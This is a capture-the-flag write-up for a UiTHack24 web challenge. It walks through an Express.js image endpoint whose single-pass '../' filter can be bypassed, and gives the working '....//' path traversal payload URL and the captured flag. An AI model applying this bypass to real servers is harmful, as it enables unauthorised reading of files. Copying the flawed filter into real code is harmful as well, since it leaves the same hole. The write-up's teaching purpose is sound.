# Space traverse

In the search for a new planet to inhabit, we have found a couple different candidates. I have collected images of them, so that you can help me decide which one to go to.

https://uithack.td.org.uit.no:8001

[⬇️ space_traversal.zip](./space_traversal.zip)

# Writeup

Looking at [app.js](./app/app.js) we can clearly see that the only place to make it load external files are in the `/images` path.

```javascript
app.get("/images", (req, res) => {
  try {
    // No path traversal
    var image = req.query.image.replace(/\.\.\//g, "");
    var image_path = path.join(__dirname, "static/images/", image);
  } catch (err) {
    console.log(err);
    res.status(404).send("Invalid request");
    return;
  }

  fs.stat(image_path, (err, _) => {
    if(err == null){
      res.sendFile(image_path);
    } else {
      res.status(404).send(image_path + " does not exist");
    }
  });
});
```

This allows you to use `/images/?image=<FILE>` to send any files. The paths is created by appending whatever you put in there to the path. So to get the flag we need to get it to load: `../../flag.txt`. But it removes `../`, as the replace is going from left to right and never repeating we can trick it by adding a extra `..` and `/`. So giving `....//` it will remove `../` from the middle and continue to the right. Leaving behind a `../` we can use. So the solution was: 

https://uithack.td.org.uit.no:8001/images/?image=....//....//flag.txt

Which returned the flag:

```
UiTHack24{n0t_th3_tr4v3rse_1_w45_3xp3c71ng}
```